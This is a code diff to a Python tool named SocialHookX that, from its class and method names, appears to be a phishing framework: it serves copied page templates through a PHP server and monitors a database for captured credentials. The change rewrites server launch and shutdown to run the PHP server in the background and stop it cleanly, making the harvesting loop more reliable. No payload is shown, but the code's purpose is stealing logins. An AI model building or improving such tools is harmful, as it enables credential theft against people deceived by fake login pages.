@@ -10,6 +10,7 @@ import signal
 import time
 import threading
 import logging
+import subprocess
 from pathlib import Path
 from typing import Optional
 
@@ -47,7 +48,7 @@ class SocialHookX:
         self.server_process = None
         
         # Initialize enhanced modules
-        self.db = CredentialDB()
+        self.db = CredentialDB(config.DATABASE)
         self.web_server = WebServer(port=self.server_port)
         self.web_server.set_database(self.db)
         self.alert_manager = AlertManager()
@@ -307,18 +308,33 @@ class SocialHookX:
         print_success(f"Template copied to {server_path}")
         print_info(f"Starting PHP server on {config.HOST}:{self.server_port}")
         
-        # Start PHP server
-        cmd = f"cd {server_path} && php -S {config.HOST}:{self.server_port}"
-        success, output = run_command(cmd)
-        
-        if success:
-            print_success("Server started")
-            self.running = True
-            
-            # Monitor for credentials
-            self.monitor_credentials(template)
-        else:
-            print_error(f"Failed to start server: {output}")
+        # Start PHP server in background so monitoring can continue.
+        try:
+            self.server_process = subprocess.Popen(
+                ["php", "-S", f"{config.HOST}:{self.server_port}"],
+                cwd=str(server_path),
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+            )
+        except FileNotFoundError:
+            print_error("Failed to start server: php executable not found")
+            self.server_process = None
+            return
+        except Exception as e:
+            print_error(f"Failed to start server: {e}")
+            self.server_process = None
+            return
+
+        # Give process a moment to fail fast (port conflict, syntax errors, etc.).
+        time.sleep(1)
+        if self.server_process.poll() is not None:
+            print_error(f"Failed to start server: process exited ({self.server_process.returncode})")
+            self.server_process = None
+            return
+
+        print_success("Server started")
+        self.running = True
+        self.monitor_credentials(template)
     
     def monitor_credentials(self, template: str):
         """Monitor for captured credentials"""
@@ -426,8 +442,16 @@ class SocialHookX:
         print_info("Cleaning up resources...")
         self.running = False
         
-        # Kill PHP server
-        run_command("pkill -f 'php -S'")
+        # Stop PHP server process if running.
+        if self.server_process and self.server_process.poll() is None:
+            self.server_process.terminate()
+            try:
+                self.server_process.wait(timeout=5)
+            except subprocess.TimeoutExpired:
+                self.server_process.kill()
+                self.server_process.wait(timeout=5)
+            print_success("Server process stopped")
+        self.server_process = None
         
         print_success("Cleanup complete")
     
